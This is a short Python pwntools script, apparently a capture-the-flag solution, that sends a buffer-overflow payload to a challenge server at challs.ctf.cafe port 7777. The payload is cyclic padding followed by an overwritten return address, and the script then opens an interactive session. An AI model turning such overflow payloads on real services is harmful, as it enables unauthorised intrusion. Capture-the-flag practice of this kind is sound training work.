from  pwn import *

#target = process("./chall")
target = process("nc")
target.sendline("challs.ctf.cafe 7777")
print(target.recvregex(b':'))
padding = cyclic(cyclic_find("oaaa"))
eip = p64(0x000000c0febabe)
payload = padding + eip
print(payload)

target.send(payload)
#target.recvline()
target.interactive()
